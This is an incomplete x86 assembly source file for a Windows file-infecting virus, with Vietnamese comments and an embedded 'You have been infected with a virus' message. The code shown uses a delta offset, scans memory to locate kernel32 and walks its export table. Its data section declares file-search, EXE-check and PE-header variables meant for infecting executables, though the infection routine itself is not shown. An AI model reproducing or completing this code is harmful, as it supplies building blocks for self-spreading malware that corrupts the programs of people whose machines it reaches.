.386
.model flat, stdcall
.stack 100h
option casemap:none
include windows.inc
include kernel32.inc
include user32.inc
includelib kernel32.lib
includelib user32.lib

.code
main: ;main----
	call Delta
Delta:
	pop ebp 
	sub ebp , offset Delta
	mov dword ptr [ebp + offset va] , ebp
	;------------------------------------Get
	mov esi , dword ptr [esp]
	and esi , 0FFFF0000h
GetKernel32:
case1:
	cmp dword ptr [ebp + offset limit] , 00h
	je GetKernel32Error
	cmp word ptr [esi] , "ZM"
	je CheckPE
case2:
	sub esi , 10000h
	dec dword ptr [ebp + offset limit]
	jmp case1
CheckPE:
	mov edi , dword ptr [esi + 3Ch]
	add edi , esi  
	cmp dword ptr [edi] , "EP"
	je GetKernel32Success
	jmp case2
GetKernel32Error:
	mov esi , 0BFF7000h	
GetKernel32Success:
	mov eax , esi
	mov eax , dword ptr [eax + 3ch]
	add eax , esi
	add eax , 120
	mov eax , dword ptr [eax]
	add eax , esi ; dia chi tuyet doi den export table
	add eax , 32
	mov eax , dword ptr [eax]
	add eax , esi 	
	mov eax , dword ptr [eax]
	add eax , esi ; dia chi thuc su cua name func
	mov eax , dword ptr [eax]
	;------------------------------------
	
	
;data---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
limit dd 20
kernel32Base dd ?
infectorCheck db 0
va dd ?
path db 100 dup (0) ;
handle dd ?
wfd WIN32_FIND_DATA <>
handleFile dd ?
pathNew db 100 dup (0)
data db 100 dup (0)
flagCheckExe db 0
virtualAddress dd ?
ifanew dd ?
sectionNumber dw ?
notificationMalware db "You have been infected with a virus", 0Dh , 0Dh  , "                      --1337DaKL--" , 0
end main
